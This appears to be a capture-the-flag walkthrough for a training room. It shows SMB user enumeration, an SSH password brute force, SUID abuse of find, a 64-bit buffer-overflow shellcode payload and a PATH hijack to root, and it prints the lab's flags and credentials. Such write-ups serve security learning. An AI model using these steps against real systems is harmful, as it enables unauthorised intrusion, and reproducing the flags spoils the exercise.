# Binex

Nmap scan 

```abap
PORT    STATE SERVICE      REASON
22/tcp  open  ssh          syn-ack ttl 64
139/tcp open  netbios-ssn  syn-ack ttl 64
445/tcp open  microsoft-ds syn-ack ttl 64
```

Logging into smb anonymously we see this

```abap
Sharename       Type      Comment
---------       ----      -------
print$          Disk      Printer Drivers
IPC$            IPC       IPC Service (THM_exploit server (Samba, Ubuntu))
```

As you can see the `IPC$`is the name of the exploit server. So lets use `enum4linux` in order to enumerate deeper. We use the hint given to us. `This is the hint you’re looking for: Hint 1: RID range 1000-1003 Hint 2: The longest username has the unsecure password.` In Linux, "RID" most commonly refers to the Relative Identifier, which is the last part of a Windows Security Identifier (SID) used in Active Directory environments. When a Linux system is integrated with a Windows domain via Samba, the RID is used to map Windows user and group SIDs to Unix user IDs (UIDs) and group IDs (GIDs).

```abap
enum4linux -a <Target IP address>
```

```abap
 ======================================================================= 
|    Users on 10.201.51.80 via RID cycling (RIDS: 500-550,1000-1050)    |
 ======================================================================= 
[I] Found new SID: S-1-22-1
[I] Found new SID: S-1-5-21-2007993849-1719925537-2372789573
[I] Found new SID: S-1-5-32
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\kel (Local User)
S-1-22-1-1001 Unix User\des (Local User)
S-1-22-1-1002 Unix User\tryhackme (Local User)
S-1-22-1-1003 Unix User\noentry (Local User)
[+] Enumerating users using SID S-1-5-32 and logon username '', password ''

```

We now have a username so lets use hydra to crack the password

```abap
hydra -l tryhackme -P /usr/share/wordlists/rockyou.txt -t 4 -f -V ssh://<TARGET_IP>
```

```abap

[22][ssh] host: 10.201.51.80   login: tryhackme   password: thebest
```

now we login in and we have a to enumerate more. Since we have a hint. We look for a SUID binary to exploit

```abap
find / -type f -perm -u=s -user des -ls 2>/dev/null

262721    236 -rwsr-sr-x   1 des      des        238080 Nov  5  2017 /usr/bin/find

```

Using GTFO we can find exploits

https://gtfobins.github.io/gtfobins/find/

```abap
SUID
If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.

This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.

sudo install -m =xs $(which find) .

./find . -exec /bin/sh -p \; -quit
```

Running this command we elevate privileges

```abap
./find . -exec /bin/sh -p \; -quit
```

Now we have the first flag as well as des username and password. So you can switch user to des

> THM{exploit_the_SUID}
> 

```abap
Good job on exploiting the SUID file. Never assign +s to any system executable files. Remember, Check gtfobins.

You flag is THM{exploit_the_SUID}

login crdential (In case you need it)
username: des
password: destructive_72656275696c64

```

Looking around we get two files. bof and bof64.c and we can read one of them and execute the other

```abap
des@THM_exploit:~$ ./bof 
Enter some string:
hello
You entered: hello

des@THM_exploit:~$ cat bof64.c 
#include <stdio.h>
#include <unistd.h>

int foo(){
	char buffer[600];
	int characters_read;
	printf("Enter some string:\n");
	characters_read = read(0, buffer, 1000);
	printf("You entered: %s", buffer);
	return 0;
}

void main(){
	setresuid(geteuid(), geteuid(), geteuid());
    	setresgid(getegid(), getegid(), getegid());

	foo();
}
des@THM_exploit:~$ 
```

Knowing this is a buffer overflow exploitation lets try to find the vulnerability.This code looks like it is vulnerable to a buffer overflow vulnerability. The user can input 1000 bytes even though the buffer is 600 bytes. This means that we can overflow into other areas of the stack. 

```abap
#include <stdio.h>
#include <unistd.h>

int foo(){
	char buffer[600];
	int characters_read;
	printf("Enter some string:\n");
	characters_read = read(0, buffer, 1000);
	printf("You entered: %s", buffer);
	return 0;
}

void main(){
	setresuid(geteuid(), geteuid(), geteuid());
    	setresgid(getegid(), getegid(), getegid());

	foo();
}
```

So lets see if we can crash the program by printing more then 600 characters. By using this command we can test it out

```abap
python -c 'print ("A" * 1000)' | ./bof 
```

We get a success!

```abap
des@THM_exploit:~$ python -c 'print("A" * 1000)' | ./bof 
Enter some string:
Segmentation fault (core dumped)
des@THM_exploit:~$ 
```

I confirmed a stack buffer overflow: the program crashed with a segmentation fault, which means it tried to execute/read/write an invalid address. That usually happens when the saved return pointer on the stack gets overwritten.

To verify control of RIP, I started with a big input and looked at the stack in GDB.

```abap
run < <(python3 -c 'print("A"*1000)')
```

```abap
x/100x $rsp
x/100x $rsp-1000
```

If I want a precise offset, I can also use a cyclic pattern (optional but solid):

```abap
# generate a unique pattern and run it
python3 - <<'PY' > /tmp/pat
from pwn import cyclic
print(cyclic(2000), end='')
PY

run < /tmp/pat
info registers rip
# Then compute:
python3 - <<'PY'
from pwn import cyclic, cyclic_find
rip = 0x???????????????  # paste RIP value from gdb
print(cyclic_find(rip))
PY
```

Note on offsets: the source hints “600-byte buffer + 8-byte saved RBP = 608,” but on this binary I actually needed **616** to overwrite RIP due to compiler alignment/local frame layout. I validated this with a marker crash and/or a cyclic pattern.

Next, I crafted a payload. I kept things simple: a NOP sled + 64-bit `/bin/sh` shellcode + post-shellcode filler + a little-endian return address that lands inside my NOP sled.

For the actual exploitation, I used compact `/bin/sh` shellcode and a small post-shellcode sled. I kept stdin open using `; cat` so my shell remained interactive.

```abap
(python -c 'print("\\x90"* (616 -27 - 50) + "\\x31\\xc0\\x48\\xbb\\xd1\\x9d\\x96\\x91\\xd0\\x8c\\x97\\xff\\x48\\xf7\\xdb\\x53\\x54\\x5f\\x99\\x52\\x57\\x54\\x5e\\xb0\\x3b\\x0f\\x05" + "\\x90" * 50 + "\\x7c\\xe3\\xff\\xff\\xff\\x7f\\x00\\x00")'; cat) | ./bof

```

With that I dropped into a shell as `kel`, read the user flag and credentials:

```abap
cat flag.txt
You flag is THM{buffer_overflow_in_64_bit}

The user credential
username: kel
password: kelvin_74656d7065726174757265
```

Flag

> THM{buffer_overflow_in_64_bit}
> 

`su kel` failed inside the non-TTY shell (“must be run from a terminal”), so I exited and ran `su` in my real terminal:

```abap
su kel
Password: kelvin_74656d7065726174757265
```

Privilege escalation to root came from a SUID binary (`exe`) in `kel`’s home directory. Its source shows a classic PATH hijack opportunity:

```abap
cat exe.c
#include <unistd.h>

void main()
{
    setuid(0);
    setgid(0);
    system("ps");
}
```

Because it’s SUID-root and calls `system("ps")` without an absolute path or PATH hardening, I put a malicious `ps` earlier in `PATH`:

```abap
cd /tmp
echo '/bin/bash -p' > ps
chmod 755 ps
export PATH=/tmp:$PATH
~/exe
```

This executed my `/tmp/ps` as root and gave me a root shell. I grabbed the final flag:

```abap
cat /root/root.txt
The flag: THM{SUID_binary_and_PATH_exploit}.
Also, thank you for your participation.

The room is built with love. DesKel out.
```

Flag

> THM{SUID_binary_and_PATH_exploit}
>
